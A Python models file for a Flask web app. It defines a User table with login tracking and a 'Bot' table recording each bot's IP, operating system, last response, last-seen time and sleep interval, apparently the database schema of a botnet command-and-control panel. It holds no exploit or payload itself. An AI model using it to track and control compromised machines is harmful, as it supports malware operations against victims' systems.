from app import db
from sqlalchemy.ext.hybrid import hybrid_property
from flask.ext.security import UserMixin
from datetime import datetime

class User(db.Model, UserMixin):
    id = db.Column(db.Integer(), primary_key=True)
    email = db.Column(db.String(255), index=True, unique=True)
    password = db.Column(db.String(255))
    active = db.Column(db.Boolean())
    last_login_at = db.Column(db.DateTime)
    current_login_at = db.Column(db.DateTime)
    last_login_ip = db.Column(db.String(50))
    current_login_ip = db.Column(db.String(50))
    login_count = db.Column(db.Integer)

    def __str__(self):
        return self.email

    # hack to make the site not need roles
    @hybrid_property
    def roles(self):
        return []
    @roles.setter
    def roles(self, role):
        pass

class Bot(db.Model):
    id = db.Column(db.Integer(), primary_key=True)
    ip = db.Column(db.String(50))
    os = db.Column(db.String(50))
    last_response = db.Column(db.String(5000))
    last_seen_time = db.Column(db.DateTime())
    sleep_interval = db.Column(db.Integer())

    def __str__(self):
        return self.ip

    @hybrid_property
    def last_seen(self):
        return (datetime.now()-self.last_seen_time).total_seconds()
